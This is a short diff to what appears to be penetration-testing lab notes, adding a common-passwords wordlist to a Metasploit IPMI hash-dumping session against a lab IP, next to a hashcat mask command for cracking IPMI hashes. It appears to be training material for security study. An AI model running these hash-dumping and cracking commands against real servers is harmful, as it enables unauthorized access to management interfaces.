@@ -62,6 +62,7 @@ hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
 ```shell-session
 msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set PASS_FILE /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt
 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
 ```
 
